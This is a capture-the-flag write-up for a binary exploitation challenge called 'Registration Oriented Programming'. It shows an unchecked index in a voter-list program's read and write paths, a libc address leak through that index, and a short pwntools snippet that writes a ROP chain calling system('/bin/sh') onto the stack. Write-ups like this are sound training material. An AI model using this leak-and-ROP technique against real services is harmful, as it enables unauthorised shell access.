# Registration Oriented Programming
## Challenge by Jason

> To register for the upcoming election, please connect to registration:
> `nc <HOST> <PORT>` 

_Disclaimer: I did not solve this challenge during CyberSci Regionals._

```
Archive:  registration.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      237  2024-11-15 22:09   Dockerfile
       39  2024-11-15 22:09   challenge.sh
    16376  2024-11-15 22:09   registration
      221  2024-11-15 22:09   xinetd.conf
---------                     -------

[*] '/home/user/files/registration'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The meat of the challenge occurs within the `main()` loop:

```c
undefined8 main(void)

{
  int d_menu_selection;
  long in_FS_OFFSET;
  int d_voter_index;
  uint d_iter;
  char ps_voter_list [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  d_voter_index = -1;
  do {
    while( true ) {
      menu();
      d_menu_selection = get_int();
      if (d_menu_selection == 3) {
                    /* exit */
        if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      if (d_menu_selection < 4) break;
LAB_00101497:
      puts("Unknown option.");
    }
    if (d_menu_selection == 1) {
                    /* register voter */
      printf("Index: ");
      d_voter_index = get_int();
      printf("Name: ");
      fgets(ps_voter_list + (long)d_voter_index * 8,8,stdin);
      puts("Registration successful!");
    }
    else {
      if (d_menu_selection != 2) goto LAB_00101497;
                    /* view list of register voters */
      puts("\n=== Registration List ===");
      for (d_iter = 0; (int)d_iter <= d_voter_index; d_iter = d_iter + 1) {
        printf("%d: ",(ulong)d_iter);
        puts(ps_voter_list + (long)(int)d_iter * 8);
      }
      puts("");
    }
  } while( true );
}
```

Typical use of this function of this program appears to enable voters to be
registered into the system, namely by writing thier name into the buffer
`ps_voter_list`. For one reason or another, the program prompts a user to enter
in their details at any index of the buffer, where no bounding checks are
performed. Therefore, it is possible to start writing data at any point in
memory

```c
    // ...
                    /* register voter */
      printf("Index: ");
      d_voter_index = get_int();
      printf("Name: ");
      fgets(ps_voter_list + (long)d_voter_index * 8,8,stdin);
      puts("Registration successful!");
    // ...
```

Along with this, the kind developers of this application also allows users to
view all registered voters, up to the latest one added to the array. However,
their implmentation simply prints the memory from the start of the array, to
where the index is last placed.

```c
    // ...
      if (d_menu_selection != 2) goto LAB_00101497;
                    /* view list of register voters */
      puts("\n=== Registration List ===");
      for (d_iter = 0; (int)d_iter <= d_voter_index; d_iter = d_iter + 1) {
        printf("%d: ",(ulong)d_iter);
        puts(ps_voter_list + (long)(int)d_iter * 8);
      }
      puts("");
    // ...
```

This chunk of code does not perform any boundary checks either. Since the buffer
is of size 136, the theoretical maximum index would be 17. As such, it is
possible to achieve an address leak with a large-enough index, which just
happened to be 19.

```
=== Registration List ===
0:
1:
2:
3:
4:
5: \x18\xa6F\x11\xfd
6: \x06
7:
8:
9:
10:
11:
12:
13:
14:
15: \xf0:V\x12\x7f
16: 0\xa7F\x11\xfd
17:
18: \xf0\xa6F\xfd
19: ʑ5\x1d\x12\x7f
20:
```

YIPPEE!!

This provides a return address to `__libc_start_call_main`

> Note: the `libc` and `ld` binary used here was extracted from the dockerfile,
> after building and running it. Then,
> [`pwninit`](https://github.com/io12/pwninit) is able to patch the binary to
> use the `libc.so.6` and `ld-linux-86-64.so.2` from the container.

As the return address points to `__libc_start_call_main`, then we already know
the address of where the `libc`.

> Note: we want to determine where `libc` is in memory for two reasons
>
> 1. Address Space Layout Randomization (ASLR) is enabled, indicated by the
>    binary being compiled as a Position Independent Executable (PIE). This
>    means that the library is placed anywhere (within a decently large region
>    of memory). This typically means that general return address overwrites
>    would be defeated, as the address used in a previous attack is very
>    unlikely to work in the next attack attempt. Leaking the address without
>    restarting the binary means we would know where to hit using some
>    arithmetic and address offsets.
> 2. We want to run code from `libc`, as it contains a lot more code that could
>    be abused, including `system`, and the string `/bin/sh` :>

Once we know where `libc` is located, it is possible to set a call to `system`
_using_ the string `/bin/sh` using [ROP](https://youtu.be/zaQVNM3or7k) (hence,
then name of the challenge).

The difficulty then namely lies in writing the addresses of the gadgets into the
stack for execution. Luckily, we now have a mechanism to write stuff onto the
stack, with no sanitation (using `fgets`)!! Thus, we can write the necessary
gadgets onto the address, starting at index 19 to overwrite the leaked
`__libc_start_call_main` address, and iterating from there. This replaces a
typical buffer overflow, which smashes the return address of the function,
implemented below.

```py
# write each address onto the stack, creating our rop chain
ropchain_list = [rop.chain()[i:i+8] for i in range(0, len(rop.chain()), 8)]
for i, addr in enumerate(ropchain_list):
    # return address is at index 19, start overwriting there
    r.sendlineafter(b"> ", bytes(f"1\n{i+19}\n", "latin-1")+addr)
```

Now, it is possible to cause the main function to return, which is just done by
selecting option 3.

Doing all this, this gives a shell and the flag can simply be `cat`-ed

This gives the following flag: `flag{rawr_d41d8cd98f00b204e9800998ecf8427e}`
